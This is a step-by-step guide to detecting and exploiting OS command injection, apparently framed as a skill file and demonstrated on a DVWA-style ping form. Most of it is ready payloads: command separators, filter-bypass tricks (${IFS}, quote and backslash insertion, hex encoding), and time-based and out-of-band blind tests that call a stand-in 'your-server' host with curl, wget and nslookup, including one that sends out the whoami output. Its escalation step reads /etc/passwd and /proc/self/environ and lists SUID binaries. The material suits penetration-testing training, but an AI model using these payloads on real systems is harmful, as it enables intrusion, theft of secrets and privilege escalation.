# Command Injection — Exploitation Skill

How to detect and exploit OS command injection:

## Step 1: Identify Candidate Parameters

Look for parameters that might interact with the OS:
- IP address or hostname fields (ping, traceroute, DNS lookup)
- File operation parameters (backup, download, convert)
- System utility parameters (whois, nslookup, dig)
- Any field that triggers server-side processing

## Step 2: Establish Baseline

Send a normal request:
```
POST /vulnerabilities/exec/
ip=127.0.0.1&Submit=Submit
→ Response: PING 127.0.0.1: 3 packets transmitted, 3 received
```

## Step 3: Basic Injection

Try command separators to append a command:

```
; id                    → Semicolon separator (Linux)
| id                    → Pipe (Linux/Windows)
|| id                   → OR operator
&& id                   → AND operator
& id                    → Background operator
`id`                    → Backtick substitution (Linux)
$(id)                   → Command substitution (Linux)
```

Example:
```
ip=127.0.0.1; id
→ Response contains: uid=33(www-data) gid=33(www-data)
→ COMMAND INJECTION CONFIRMED
```

## Step 4: Filter Bypass

If basic injection is blocked, identify WHAT is filtered:

### Semicolons filtered
```
127.0.0.1 | id          → Pipe operator
127.0.0.1 || id         → OR operator
127.0.0.1 && id         → AND operator
```

### Spaces filtered
```
127.0.0.1;cat${IFS}/etc/passwd     → ${IFS} = Internal Field Separator
127.0.0.1;cat$IFS/etc/passwd       → Same without braces
127.0.0.1;{cat,/etc/passwd}        → Brace expansion
127.0.0.1;cat</etc/passwd          → Input redirection
127.0.0.1;cat%09/etc/passwd        → Tab character (%09)
```

### Keywords filtered (e.g., `cat`, `id`)
```
127.0.0.1;c'a't /etc/passwd        → Quote insertion
127.0.0.1;c\at /etc/passwd         → Backslash insertion
127.0.0.1;/bin/c?t /etc/passwd     → Wildcard
127.0.0.1;$(printf '\x63\x61\x74') /etc/passwd  → Hex encoding
```

## Step 5: Blind Detection

If no output is visible in response:

### Time-based
```
127.0.0.1; sleep 5       → Response takes 5+ seconds = confirmed
127.0.0.1 | sleep 5      → Same with pipe
```

### Out-of-band (if you have an external server)
```
127.0.0.1; curl http://your-server/callback
127.0.0.1; nslookup your-server.com
127.0.0.1; wget http://your-server/$(whoami)
```

## Step 6: Escalate

Once confirmed:
```
; id                          → Current user
; uname -a                    → OS version
; cat /etc/passwd             → User enumeration
; cat /proc/self/environ      → Environment variables
; ls -la /                    → Filesystem enumeration
; find / -perm -4000 2>/dev/null  → SUID binaries (privesc)
```
